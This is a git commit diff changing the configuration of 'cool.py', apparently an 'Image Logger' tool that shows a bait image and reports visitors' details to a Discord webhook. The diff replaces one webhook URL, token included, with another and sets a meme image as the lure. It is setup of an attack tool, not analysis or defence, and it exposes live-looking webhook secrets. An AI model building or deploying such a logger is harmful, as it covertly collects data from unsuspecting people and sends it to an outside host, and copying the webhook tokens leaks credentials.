23025df5716028237698ea9487bdbca2904289f9
lukadsorensen-afk <lukadsorensen@gmail.com>
2026-01-18 16:55:43 +0100

    Update cool.py

--- api/cool.py
+++ api/cool.py
@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1340710771579027559/5aVqCAu7tfu2wNhdpUYfAN5iweWKZb6yUTbmP7bWUxvBx6yt-gUwy7of1q3MSsfec6uW",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1462474766236651762/HDF14e8nPjrUKWmEnjtgyEpg719pKqVL5t2Qwo-vtej39kTUJnYmCaiSwQSZHpw15WSh",
+    "image": "https://i.imgflip.com/5xpp14.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "Nice guys": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
